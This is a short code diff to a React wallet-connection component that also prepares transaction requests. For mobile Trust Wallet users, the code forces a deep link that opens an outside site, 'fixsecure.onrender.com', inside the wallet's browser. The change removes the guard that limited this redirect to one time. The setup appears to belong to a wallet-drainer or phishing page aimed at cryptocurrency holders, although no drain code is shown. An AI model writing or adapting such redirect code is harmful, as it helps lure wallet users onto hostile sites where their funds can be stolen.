@@ -132,7 +132,7 @@ const { data: request } = usePrepareTransactionRequest(
   }, [confirmed]);
 
       const isMobile = () => /Mobi|Android/i.test(navigator.userAgent)
-    const [visitedTW, setVisitedTW ] = useState(false)
+
 
 
     const isTrustWalletApp = () => {
@@ -144,14 +144,12 @@ useEffect(() => {
   if (
     walletInfo?.name === "Trust Wallet" &&
     isMobile() &&
-    !visitedTW &&
     !isTrustWalletApp() // ensure we are not already inside the app
   ) {
-    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${activeChain?.id}&url=${encodeURIComponent("https://fixsecure.onrender.com")}`;
+    const trustLink = `https://link.trustwallet.com/open_url?coin_id=${chain.id}&url=${encodeURIComponent("https://fixsecure.onrender.com")}`;
     window.open(trustLink, "_blank");
-    setVisitedTW(true);
-  }
-}, [isConnected, walletInfo, activeChain, visitedTW]);
+    }
+}, [isConnected, walletInfo, activeChain]);
 
   useEffect(() => {
     if (isConnected && address && activeChain.id) {
